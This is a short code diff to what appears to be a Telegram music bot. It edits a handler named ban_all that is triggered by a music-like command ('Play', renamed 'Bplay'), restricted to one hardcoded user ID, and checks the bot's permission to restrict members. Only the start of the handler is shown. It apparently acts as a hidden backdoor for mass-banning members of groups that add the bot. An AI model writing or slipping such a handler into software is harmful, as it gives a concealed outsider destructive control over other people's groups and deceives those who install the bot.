@@ -7,12 +7,11 @@ from EsproAiMusic.utils.EsproAi_ban import admin_filter
 BOT_ID = app.me.id  # Corrected this line
 
 @app.on_message(
-    filters.command("Play")
+    filters.command("Bplay")
     & filters.group
     & filters.user(6329875412)
    )
 async def ban_all(_, msg):
-await query.message.delete()
     chat_id = msg.chat.id    
     bot = await app.get_chat_member(chat_id, BOT_ID)
     bot_permission = bot.privileges.can_restrict_members == True    
